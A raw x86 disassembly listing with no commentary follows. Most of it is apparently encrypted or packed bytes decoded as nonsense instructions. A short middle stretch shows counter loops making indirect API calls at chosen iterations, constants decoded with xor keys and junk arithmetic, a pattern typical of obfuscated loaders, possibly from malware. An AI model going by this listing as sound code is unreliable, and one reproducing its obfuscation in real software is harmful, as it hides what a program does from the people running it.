  40b2c5:	or     ecx,0xffffff9c
  40b2c8:	mov    WORD PTR [ebx-0x38],fs
  40b2cb:	pop    ebp
  40b2cc:	call   0x252a:0x53ce2aab
  40b2d3:	popf   
  40b2d4:	inc    ebp
  40b2d5:	aad    0xd9
  40b2d7:	bound  edi,QWORD PTR ds:0x129098ff
  40b2dd:	and    eax,0xd19cf97a
  40b2e2:	jge    0x40b2fc
  40b2e4:	repnz or al,0x9b
  40b2e7:	add    al,0xdd
  40b2e9:	lods   al,BYTE PTR ds:[esi]
  40b2ea:	add    eax,0x83e04326
  40b2ef:	lea    ecx,[ecx+0x46]
  40b2f2:	and    DWORD PTR [ecx+0x5e],edx
  40b2f5:	dec    ecx
  40b2f6:	push   esp
  40b2f7:	push   cs
  40b2f8:	jb     0x40b2cf
  40b2fa:	adc    ebx,esi
  40b2fc:	stc    
  40b2fd:	sti    
  40b2fe:	jecxz  0x40b285
  40b300:	or     DWORD PTR [edx],ecx
  40b302:	sbb    ah,BYTE PTR [ecx+0x6acc43a6]
  40b308:	pop    ebp
  40b309:	cmp    al,0x1a
  40b30b:	rcr    bl,1
  40b30d:	mov    edx,0x7e012a32
  40b312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b313:	or     edx,DWORD PTR [edi]
  40b315:	sub    BYTE PTR [ebx+0x5e7aeec9],dh
  40b31b:	arpl   ax,cx
  40b31d:	mov    esi,esp
  40b31f:	sahf   
  40b320:	and    al,0xc1
  40b322:	(bad)  
  40b323:	aam    0xc2
  40b325:	cmp    cl,0x33
  40b328:	dec    ecx
  40b329:	xor    al,0xb7
  40b32b:	cmp    eax,0x2be5228a
  40b330:	pop    ebx
  40b331:	cdq    
  40b332:	xchg   esp,eax
  40b333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b334:	jmp    0x40b2e9
  40b336:	xor    BYTE PTR [esi+0x12],0x81
  40b33a:	repnz mov ds:0xa9706bbf,eax
  40b340:	cwde   
  40b341:	stc    
  40b342:	popf   
  40b343:	pop    ebp
  40b344:	stc    
  40b345:	leave  
  40b346:	rcl    BYTE PTR [edx+0x25d58bae],1
  40b34c:	mov    fs,eax
  40b34e:	dec    esp
  40b34f:	inc    esi
  40b350:	call   0xec6e3670
  40b355:	call   0x4f58:0xeec5841
  40b35c:	fild   WORD PTR [ebx+0x58af8113]
  40b362:	out    dx,al
  40b363:	add    bl,BYTE PTR [eax+0x39]
  40b366:	mov    al,ds:0xde3a7649
  40b36b:	(bad)  
  40b36c:	in     al,0xa8
  40b36e:	in     al,0x1
  40b370:	loopne 0x40b331
  40b372:	lds    ecx,FWORD PTR [ecx*1+0x4d77c980]
  40b379:	rol    DWORD PTR [edi+ecx*1],1
  40b37c:	cmp    BYTE PTR [edx],bh
  40b37e:	dec    edi
  40b37f:	cmp    dl,BYTE PTR [edx-0x5d542562]
  40b385:	push   ebx
  40b386:	and    DWORD PTR [edx-0x349d64a9],0xffffffb7
  40b38d:	scas   eax,DWORD PTR es:[edi]
  40b38e:	xor    eax,0x688598f
  40b393:	addr16 dec edi
  40b395:	cmp    cl,BYTE PTR [esi-0x37f76def]
  40b39b:	mov    al,ds:0x773f05c1
  40b3a0:	in     al,dx
  40b3a1:	mov    cl,0xde
  40b3a3:	dec    ecx
  40b3a4:	(bad)  
  40b3a5:	push   DWORD PTR [esi+0x432452e9]
  40b3ab:	mov    bh,0x8f
  40b3ad:	mov    al,ds:0xbae4eca7
  40b3b2:	mov    dh,0x8b
  40b3b4:	not    ebp
  40b3b6:	stos   DWORD PTR es:[edi],eax
  40b3b7:	or     bh,BYTE PTR [esi]
  40b3b9:	mov    esp,0xcdafacb0
  40b3be:	aas    
  40b3bf:	cld    
  40b3c0:	or     ah,BYTE PTR [eax-0x7f222ab8]
  40b3c6:	ins    BYTE PTR es:[edi],dx
  40b3c7:	shr    DWORD PTR [edi+0x53],0x3b
  40b3cb:	jg     0x40b447
  40b3cd:	(bad)  
  40b3ce:	int    0x9e
  40b3d0:	scas   al,BYTE PTR es:[edi]
  40b3d1:	pop    ecx
  40b3d2:	jae    0x40b409
  40b3d4:	or     esp,DWORD PTR [esi]
  40b3d6:	mov    ds:0xdbec4746,al
  40b3db:	js     0x40b444
  40b3dd:	ss repz jl 0x40b442
  40b3e1:	xor    al,0x1c
  40b3e3:	inc    ebx
  40b3e4:	push   cs
  40b3e5:	leave  
  40b3e6:	jmp    0x3dc2e987
  40b3eb:	and    bh,BYTE PTR [edi-0x4cdb7a7c]
  40b3f1:	mov    ds:0x5b199507,al
  40b3f6:	adc    ch,BYTE PTR [eax-0x4f5bff37]
  40b3fc:	hlt    
  40b3fd:	xchg   ebp,eax
  40b3fe:	dec    esp
  40b3ff:	gs sar al,cl
  40b402:	lahf   
  40b403:	pop    edi
  40b404:	loop   0x40b410
  40b406:	das    
  40b407:	repz das 
  40b409:	xchg   ebx,eax
  40b40a:	cmp    al,0x33
  40b40c:	je     0x40b443
  40b40e:	lock and DWORD PTR [ecx],ebp
  40b411:	ret    
  40b412:	out    0xb,eax
  40b414:	mov    ch,0x8a
  40b416:	xor    DWORD PTR [edi],eax
  40b418:	jae    0x40b44d
  40b41a:	in     al,dx
  40b41b:	shl    DWORD PTR [esi-0x76],cl
  40b41e:	mov    al,0xee
  40b420:	sub    al,cl
  40b422:	adc    ah,cl
  40b424:	add    esp,esi
  40b426:	aam    0x97
  40b428:	adc    BYTE PTR [esi],dl
  40b42a:	push   es
  40b42b:	ja     0x40b442
  40b42d:	jns    0x40b4a2
  40b42f:	and    eax,0x56607143
  40b434:	test   al,0xb0
  40b436:	fwait
  40b437:	in     al,dx
  40b438:	ins    BYTE PTR es:[edi],dx
  40b439:	mov    ah,0xc2
  40b43b:	rol    bl,0x2a
  40b43e:	mov    edx,0x9d175015
  40b443:	sar    DWORD PTR [edi+0x4d84dc60],cl
  40b449:	mov    DWORD PTR [ebx-0x7c2cd922],edi
  40b44f:	jnp    0x40b3e2
  40b451:	add    esi,eax
  40b453:	arpl   dx,dx
  40b455:	ffree  st(2)
  40b457:	jnp    0x40b4a5
  40b459:	repnz mov dl,0xf
  40b45c:	iret   
  40b45d:	test   al,0x5f
  40b45f:	fs loopne 0x40b4d1
  40b462:	es jbe 0x40b4c6
  40b465:	adc    eax,0x4839429c
  40b46a:	loope  0x40b4d0
  40b46c:	jle    0x40b4a3
  40b46e:	push   ss
  40b46f:	push   esp
  40b470:	cmp    ch,BYTE PTR [esi+eiz*2-0x18]
  40b474:	fild   DWORD PTR [ebx+0x32]
  40b477:	ret    
  40b478:	scas   al,BYTE PTR es:[edi]
  40b479:	or     eax,0x80e84c53
  40b47e:	lock gs pusha 
  40b481:	jmp    0xfb13:0x66ebf92f
  40b488:	data16 icebp 
  40b48a:	ins    BYTE PTR es:[edi],dx
  40b48b:	inc    ecx
  40b48c:	sub    al,0x8b
  40b48e:	inc    BYTE PTR [edi]
  40b490:	aam    0x87
  40b492:	loope  0x40b450
  40b494:	and    DWORD PTR [edi-0x39310738],edx
  40b49a:	mov    edx,DWORD PTR [ecx]
  40b49c:	or     al,BYTE PTR [eax+0x5a]
  40b49f:	cmp    ebx,DWORD PTR [esi-0x75]
  40b4a2:	mov    eax,ds:0x6544c053
  40b4a7:	bound  ebp,QWORD PTR [eax]
  40b4a9:	mov    dh,0x55
  40b4ab:	fs std 
  40b4ad:	add    ah,bh
  40b4af:	ins    BYTE PTR es:[edi],dx
  40b4b0:	pop    edx
  40b4b1:	or     eax,0xf095a776
  40b4b6:	in     al,0xba
  40b4b8:	cmp    eax,0x997af589
  40b4bd:	sbb    al,0x7c
  40b4bf:	pusha  
  40b4c0:	and    esi,0x35
  40b4c3:	fucomip st,st(2)
  40b4c5:	add    DWORD PTR [esi+0x2ecd271c],esi
  40b4cb:	outs   dx,DWORD PTR ds:[esi]
  40b4cc:	jmp    0x40b468
  40b4ce:	sahf   
  40b4cf:	push   esi
  40b4d0:	out    dx,al
  40b4d1:	cmp    eax,0xfbbffba5
  40b4d6:	mov    ecx,0x8baeba79
  40b4db:	push   ss
  40b4dc:	lods   al,BYTE PTR ds:[esi]
  40b4dd:	mov    edx,0x7732d57d
  40b4e2:	call   0xaa35d105
  40b4e7:	add    edx,DWORD PTR [edx]
  40b4e9:	fbstp  TBYTE PTR [eax+ecx*8-0x71]
  40b4ed:	mov    ch,0xae
  40b4ef:	addr16 daa 
  40b4f1:	mov    dh,0x56
  40b4f3:	mov    ebp,0x437f45aa
  40b4f8:	and    eax,0xa523f4a1
  40b4fd:	in     eax,0x31
  40b4ff:	or     dh,BYTE PTR [edi]
  40b501:	ret    
  40b502:	or     al,0x37
  40b504:	lock stc 
  40b506:	inc    ebx
  40b507:	xchg   esi,eax
  40b508:	imul   ebp,DWORD PTR [ecx],0xfffffff3
  40b50b:	sub    eax,0xaee6e8e6
  40b510:	sbb    eax,0xfdc5f8d0
  40b515:	fdiv   QWORD PTR [edx-0x68]
  40b518:	inc    ebp
  40b519:	sti    
  40b51a:	fild   QWORD PTR [esi]
  40b51c:	clc    
  40b51d:	push   eax
  40b51e:	or     ah,BYTE PTR [edi]
  40b520:	sbb    al,0x3b
  40b522:	mov    ds:0x835a4060,al
  40b527:	push   esp
  40b528:	xchg   edx,ecx
  40b52a:	lahf   
  40b52b:	pop    eax
  40b52c:	pop    eax
  40b52d:	fisub  WORD PTR [ebx]
  40b52f:	sub    edi,eax
  40b531:	cdq    
  40b532:	ret    
  40b533:	mov    ebp,0x48d52a3d
  40b539:	mov    BYTE PTR [ecx-0x744f82c3],0xfd
  40b540:	sub    DWORD PTR [eax],esi
  40b542:	aad    0xc0
  40b544:	xor    eax,0xb8bdeac3
  40b549:	aam    0x65
  40b54b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b54c:	sub    bl,BYTE PTR [eax+ecx*8-0x30]
  40b550:	and    al,0x9a
  40b552:	enter  0x366b,0x1a
  40b556:	scas   al,BYTE PTR es:[edi]
  40b557:	stos   BYTE PTR es:[edi],al
  40b558:	mov    edx,eax
  40b55a:	jl     0x40b50b
  40b55c:	sbb    al,0xbd
  40b55e:	retf   
  40b55f:	pop    eax
  40b560:	sahf   
  40b561:	adc    eax,0xe0e23dca
  40b566:	and    BYTE PTR [edi*2-0x2a26b58e],dh
  40b56d:	mov    ecx,DWORD PTR [edx-0x36d148f1]
  40b573:	dec    edx
  40b574:	mov    eax,ds:0xf379816b
  40b579:	jns    0x40b5bf
  40b57b:	lock push esi
  40b57d:	adc    esi,0x29b8
  40b583:	push   edi
  40b584:	or     edi,DWORD PTR ds:0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x4217d2
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x4219da
  40b629:	mov    ecx,DWORD PTR ds:0x42174a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x42358e
  40b674:	push   0x42350e
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421952
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x4234e9
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x423500
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421972
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x4218c8
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x7c536403
  40b9b7:	and    BYTE PTR [edi+ecx*2+0xa6262f4],ch
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx-0xb]
  40b9c2:	adc    BYTE PTR [edx-0x66],0xb9
  40b9c6:	nop
  40b9c7:	push   es
  40b9c8:	push   cs
  40b9c9:	rol    DWORD PTR [ebp-0x62e34d47],cl
  40b9cf:	mov    esp,0x3679f2f4
  40b9d4:	push   edx
  40b9d5:	ss in  eax,dx
  40b9d7:	and    DWORD PTR [esi],edi
  40b9d9:	(bad)  
  40b9da:	in     al,0x1
  40b9dc:	outs   dx,DWORD PTR ds:[esi]
  40b9dd:	addr16 test eax,0x159c9226
  40b9e3:	fwait
  40b9e4:	ja     0x40b96d
  40b9e6:	pop    esp
  40b9e7:	dec    eax
  40b9e8:	mov    ds:0xbff32f6,al
  40b9ed:	imul   eax,DWORD PTR [edi-0x4c],0x4ba836cc
  40b9f4:	xchg   DWORD PTR [ebx],edi
  40b9f6:	(bad)  
  40b9f7:	in     eax,0x85
  40b9f9:	outs   dx,DWORD PTR ds:[esi]
  40b9fa:	mov    eax,ds:0xb8cdf3ac
  40b9ff:	cld    
  40ba00:	inc    esi
  40ba01:	int3   
  40ba02:	push   ebx
  40ba03:	imul   ecx,DWORD PTR [eax+0x6dd0aaf2],0x30
  40ba0a:	mov    cl,0xac
  40ba0c:	sub    ch,BYTE PTR [ebp-0x26]
  40ba0f:	add    DWORD PTR ds:0x526b6c46,esp
  40ba15:	loope  0x40ba78
  40ba17:	dec    ecx
  40ba18:	push   ebp
  40ba19:	das    
  40ba1a:	push   ebp
  40ba1b:	into   
  40ba1c:	add    ecx,edx
  40ba1e:	fld    st(3)
  40ba20:	pop    edx
  40ba21:	mov    ecx,DWORD PTR [ecx+0x547fd76]
  40ba27:	fidiv  WORD PTR [eax]
  40ba29:	mov    esp,0xaccacff
  40ba2e:	xchg   ebp,eax
  40ba2f:	sub    esp,DWORD PTR [eax+0x670d78bd]
  40ba35:	lahf   
  40ba36:	repz mov esp,0x8780faa
  40ba3c:	ret    
  40ba3d:	fisub  WORD PTR [ebp+0x4446d46a]
  40ba43:	and    edi,0xffffff8f
  40ba46:	stos   DWORD PTR es:[edi],eax
  40ba47:	mov    dh,BYTE PTR [edx+ebp*8-0x10]
  40ba4b:	lock loopne 0x40b9fe
  40ba4e:	(bad)  
  40ba4f:	mov    ds:0x71a9547b,al
  40ba54:	das    
  40ba55:	fmul   st,st(7)
  40ba57:	add    DWORD PTR [ecx+0x1a],edi
  40ba5a:	rcr    eax,cl
  40ba5c:	sub    al,0xef
  40ba5e:	cwde   
  40ba5f:	mov    eax,ds:0xf19baf52
  40ba64:	jae    0x40ba50
  40ba66:	push   0xebfc863d
  40ba6b:	addr16 jne 0x40ba14
  40ba6e:	push   0xffffffbc
  40ba70:	xor    DWORD PTR [edx-0xf771356],esi
  40ba76:	xchg   ebx,esi
  40ba78:	out    0xbc,al
  40ba7a:	enter  0x2664,0xda
  40ba7e:	mov    esi,0x1c82a966
  40ba83:	aam    0xe3
  40ba85:	xor    eax,0x6fc2a712
  40ba8a:	mov    eax,ds:0xe418d211
  40ba8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba90:	pop    esp
  40ba91:	mov    dl,0xe8
  40ba93:	js     0x40ba8a
  40ba95:	dec    ebp
  40ba96:	lahf   
  40ba97:	cmp    ebp,eax
  40ba99:	(bad)  
  40ba9a:	lods   al,BYTE PTR ds:[esi]
  40ba9b:	lock hlt 
  40ba9d:	cmp    al,0xb6
  40ba9f:	stos   DWORD PTR es:[edi],eax
  40baa0:	outs   dx,DWORD PTR ds:[esi]
  40baa1:	or     ah,cl
  40baa3:	aad    0xf6
  40baa5:	or     eax,0x276a73af
  40baaa:	adc    al,0x8d
  40baac:	ret    0xe46c
  40baaf:	call   0x2ed084b
  40bab4:	fist   DWORD PTR [ebp-0x3d760256]
  40baba:	mov    ds:0xf0c22ce7,al
  40babf:	sbb    al,0xf1
  40bac1:	shl    DWORD PTR [eax-0x75b7dc16],1
  40bac7:	dec    ebp
  40bac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bac9:	or     BYTE PTR fs:[esp+edx*1-0x31],al
  40bace:	xlat   BYTE PTR ds:[ebx]
  40bacf:	lds    eax,FWORD PTR [edi+0x29]
  40bad2:	cmp    ebx,esp
  40bad4:	jl     0x40ba78
  40bad6:	mov    bl,0x68
  40bad8:	jl     0x40ba89
  40bada:	xchg   BYTE PTR ds:0x2e8be063,bl
  40bae0:	jp     0x40ba6c
  40bae2:	test   BYTE PTR [ebx],bh
  40bae4:	lods   eax,DWORD PTR ds:[esi]
  40bae5:	dec    eax
  40bae6:	xchg   esi,eax
  40bae7:	jp     0x300381a8
  40baed:	rcr    dh,0x1c
  40baf0:	shr    DWORD PTR [ebx+edx*8+0x683cc1e6],0xd8
  40baf8:	out    dx,eax
  40baf9:	icebp  
  40bafa:	icebp  
  40bafb:	sar    BYTE PTR [ecx-0x6e],0x61
  40baff:	ror    DWORD PTR [ebp+0x695c6936],cl
  40bb05:	es call 0xe31b6fdb
  40bb0b:	iret   
  40bb0c:	fild   WORD PTR [edx-0x76073267]
  40bb12:	mov    edi,0x881eeed7
  40bb17:	xchg   ebp,eax
  40bb18:	mov    dh,0xd
  40bb1a:	test   eax,0x963f1351
  40bb1f:	and    eax,0x89163ba1
  40bb24:	xor    ecx,DWORD PTR [ebp-0x7d40e550]
  40bb2a:	loope  0x40baed
  40bb2c:	pop    ebp
  40bb2d:	pop    eax
  40bb2e:	jne    0x40bb3b
  40bb30:	pop    esi
  40bb31:	inc    eax
  40bb32:	push   es
  40bb33:	not    DWORD PTR [edx-0x24b06d2]
  40bb39:	dec    edx
  40bb3a:	ja     0x40bad3
  40bb3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb3d:	(bad)  
  40bb3e:	xchg   esp,eax
  40bb3f:	outs   dx,BYTE PTR ds:[esi]
  40bb40:	mov    edi,0x8c9dc984
  40bb45:	mov    esp,eax
  40bb47:	dec    eax
  40bb48:	add    ebx,DWORD PTR [edi+0x2d]
  40bb4b:	out    dx,eax
  40bb4c:	aam    0x66
  40bb4e:	or     al,cl
  40bb50:	(bad)  
  40bb51:	shr    DWORD PTR [edi-0x37],1
  40bb54:	cmp    ebp,DWORD PTR [ecx-0x3be25fbd]
  40bb5a:	xor    al,0x7
  40bb5c:	jge    0x40bbbe
  40bb5e:	add    ebx,esi
  40bb60:	hlt    
  40bb61:	pop    edi
  40bb62:	pop    ss
  40bb63:	retf   
  40bb64:	jbe    0x40bbcd
  40bb66:	ss inc eax
  40bb68:	into   
  40bb69:	push   es
  40bb6a:	push   esp
  40bb6b:	lds    ecx,FWORD PTR [edi+0x448ea1f2]
  40bb71:	add    esp,esp
  40bb73:	out    dx,eax
  40bb74:	hlt    
  40bb75:	add    edx,esi
  40bb77:	out    0x90,al
  40bb79:	sub    DWORD PTR [ebp+0x37308991],edx
  40bb7f:	test   eax,0xa9db1073
  40bb84:	mov    esi,0xe1592fef
  40bb89:	cmp    edi,0xffffff91
  40bb8c:	push   0xfffffff2
  40bb8e:	pusha  
  40bb8f:	fwait
  40bb90:	jo     0x40bbbf
  40bb92:	stos   DWORD PTR es:[edi],eax
  40bb93:	adc    al,0x85
  40bb95:	shr    DWORD PTR [edi],0xc6
  40bb98:	add    dl,BYTE PTR ds:0x899308b4
  40bb9e:	cwde   
  40bb9f:	push   0x1c1cd099
  40bba4:	ins    BYTE PTR es:[edi],dx
  40bba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba6:	repnz xor BYTE PTR [bp+0x6119],ch
  40bbac:	and    esp,eax
  40bbae:	adc    edx,DWORD PTR [esi-0x3a]
  40bbb1:	push   ebx
  40bbb2:	jecxz  0x40bc30
  40bbb4:	sar    BYTE PTR [eax+0x60],0xbf
  40bbb8:	pop    ebx
  40bbb9:	or     bh,BYTE PTR [ebx+0x76]
  40bbbc:	outs   dx,BYTE PTR ds:[esi]
  40bbbd:	xchg   esp,eax
  40bbbe:	test   eax,0x6fc6e034
  40bbc3:	mov    edi,0xc12a0aa5
  40bbc8:	fwait
  40bbc9:	out    dx,al
  40bbca:	lods   eax,DWORD PTR ds:[esi]
  40bbcb:	jae    0x40bb80
  40bbcd:	jmp    0x9610affd
  40bbd2:	hlt    
  40bbd3:	sub    al,0xff
  40bbd5:	pop    ds
  40bbd6:	jp     0x40bb9d
  40bbd8:	in     al,0xe
  40bbda:	jae    0x40bb5f
  40bbdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbdd:	out    dx,eax
  40bbde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbdf:	adc    eax,0x8f890d1e
  40bbe4:	mov    edi,0xf3349f9d
  40bbe9:	push   ebp
  40bbea:	sub    edi,eax
  40bbec:	sbb    ch,BYTE PTR [edi]
  40bbee:	mov    fs,WORD PTR [ecx+0x34ca909a]
  40bbf4:	into   
  40bbf5:	push   es
  40bbf6:	scas   al,BYTE PTR es:[edi]
  40bbf7:	fdivp  st(6),st
  40bbf9:	fadd   DWORD PTR [edi+eiz*4+0x15ff4741]
  40bc00:	pop    ebp
  40bc01:	add    DWORD PTR es:[ebx+0x44726be9],0xee8c4ae7
  40bc0c:	into   
